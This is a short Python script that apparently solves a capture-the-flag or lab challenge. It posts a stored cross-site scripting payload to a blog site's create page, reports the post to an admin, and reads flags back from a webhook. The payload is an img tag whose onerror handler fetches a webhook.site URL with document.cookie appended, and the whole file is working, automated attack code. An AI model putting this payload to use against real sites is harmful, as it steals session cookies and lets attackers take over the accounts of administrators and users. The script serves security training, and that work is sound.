import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()

    def main(self):
        BASE_URL = "https://closedlearning.quoccacorp.com"
        PAYLOAD = f'''<img src="x" onerror="fetch(`{self.webhooksite.url}?q=${{document.cookie}}`)">'''

        # WAF: Title cannot contain /
        response = self.session.post(f"{BASE_URL}/create.php", data={"title": "title", "content": PAYLOAD})

        # Report to Admin
        blog_post_url = response.url
        self.session.post(blog_post_url)

        self.webhooksite.find_flags()

if __name__ == "__main__":
    Solver().main()
